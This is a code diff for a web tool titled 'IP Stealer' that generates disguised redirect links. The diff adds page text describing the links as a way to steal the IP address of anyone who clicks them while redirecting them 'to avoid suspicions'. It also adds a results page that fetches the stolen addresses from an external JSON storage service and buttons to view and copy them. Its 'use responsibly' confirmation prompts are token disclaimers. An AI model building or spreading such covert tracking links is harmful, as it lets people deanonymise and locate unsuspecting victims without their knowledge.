@@ -84,18 +84,37 @@
     .copy-btn:hover {
       background: #ffffff33;
     }
+
+    .results-btn {
+      margin-top: 10px;
+      background: #00a2ff93;
+      color: #fff;
+    }
+
+    .results-btn:hover {
+      background: #00a2ff;
+    }
     span{
       font-size: 0.8rem;
       opacity: 0.8;
+    }
+    #IP{
+      display: block;
+      margin-top: 20px;
+      font-size: 3rem;
+      font-weight: bold;
+      text-align: center;
     }
   </style>
 </head>
 <body>
 
-  <div class="card">
-    <h1>IP Stealer URL Generator</h1>
+  <div class="card" id="Generator">
+    <h1>IP Stealer</h1>
+    <h3>URL Generator</h3>
+    <span><b>Instructions:</b> Enter a redirect URL below to generate a link that will steal the IP address of anyone who clicks it, and redirects them to the specified URL (to avoid suspicions).</span>
 
-    <label for="redirect">Redirect URL</label>
+    <b><label for="redirect" style="display: block; margin-top:10px;">Redirect URL</label></b>
     <input
       id="redirect"
       type="url"
@@ -110,9 +129,58 @@
     <button class="copy-btn" id="copyBtn" style="display:none" onclick="copyLink()">
       Copy to Clipboard
     </button>
+    <button class="results-btn" id="resultsBtn" style="display:none" onclick="showResults()">
+      Check Results
+    </button>
+    <span id="info2" style="display: none; margin-top:10px;">Note: The generated link is only guaranteed valid for 96 hours. Afterwards, there is a likely chance that the link will still be active, however the stolen IP may be overwritten by other users (however this is currently highly unlikely).</span>
+  </div>
+  <div class="card" id="Results" style="display:none;">
+    <h1>IP Stealer</h1>
+    <h3>Results (Stolen IP)</h3>
+    <span id="IP">Fetching...</span>
+    <span style="display:none;" id="Help Message"><b>What does this mean? </b>The targeted user has not clicked on the link yet so no IP address has been stolen yet, or there was an error saving the IP address to cloud, often due to too many requests in one day.</span>
+    <button class="copy-btn" id="copyBtn2" style="display:none" onclick="copyIP()">
+      Copy to Clipboard
+    </button>
+    <span>Powered by ipify.org</span>
   </div>
 
   <script>
+    // Parse URL parameters
+    const params = new URLSearchParams(window.location.search);
+    const id = params.get("id");
+
+    if (!id) {
+      console.warn("No ID provided in URL. Opening generator...");
+    } else {
+      document.getElementById("Generator").style.display = "none";
+      document.getElementById("Results").style.display = "block";
+
+      const keyName = id; // this is stored in a variable
+
+      fetch("https://api.jsonstorage.net/v1/json/a2e95c6f-02c1-433e-8a1e-650992a971f1/4386bb18-5345-4061-bf5b-cbeab140cd50")
+        .then(response => {
+          if (!response.ok) throw new Error("Network response was not OK");
+          return response.json();
+        })
+        .then(data => {
+          const value = data[keyName]; // 👈 important part
+          console.log("Value for key:", keyName, value);
+          document.getElementById("IP").innerText = value
+            ? value
+            : "No IP found.";
+          if (!value) {
+            document.getElementById("Help Message").style.display = "block";
+          } else {
+            document.getElementById("copyBtn2").style.display = "block";
+          }
+        })
+        .catch(error => {
+          console.error("GET error:", error);
+          document.getElementById("IP").innerText = "Error fetching IP.";
+        });
+    }
+
     function generate6DigitTimeCode(date = new Date()) {
         const month = date.getMonth() + 1;
         const day = date.getDate();
@@ -143,8 +211,12 @@
         alert("Please enter a redirect URL.");
         return;
       }
+      if (!confirm("By generating this link, you agree to use it responsibly and ethically. Misuse of this tool may be illegal and unethical. Do you wish to proceed?")) {
+        return;
+      }
 
       const id = generate6DigitTimeCode();
+      document.id = id;
       const encodedRedirect = encodeURIComponent(redirectInput.value);
 
       lastGeneratedURL =
@@ -158,12 +230,28 @@
       `;
 
       copyBtn.style.display = "block";
+      document.getElementById("resultsBtn").style.display = "block";
       document.getElementById("info1").style.display = "block";
+      document.getElementById("info2").style.display = "block";
     }
 
-    function copyLink() {
-      navigator.clipboard.writeText(lastGeneratedURL);
-      alert("Link copied to clipboard!");
+      function copyLink() {
+        navigator.clipboard.writeText(lastGeneratedURL);
+        alert("Link copied to clipboard!");
+      }
+
+      function copyIP() {
+        if (confirm("Upon copying the IP address, you confirm that you will not use this information for malicious purposes. Misuse of this tool may be illegal and unethical. Do you wish to proceed?")) {
+          navigator.clipboard.writeText(document.getElementById("IP").innerText);
+          alert("IP copied to clipboard!");
+        } else {
+          alert("Copying cancelled.");
+        }
+      }
+
+    function showResults() {
+      const resultsURL = `https://chibbit-99.github.io/IP-Address-Stealer/?id=${document.id}`;
+      window.open(resultsURL, "_blank");
     }
   </script>
 
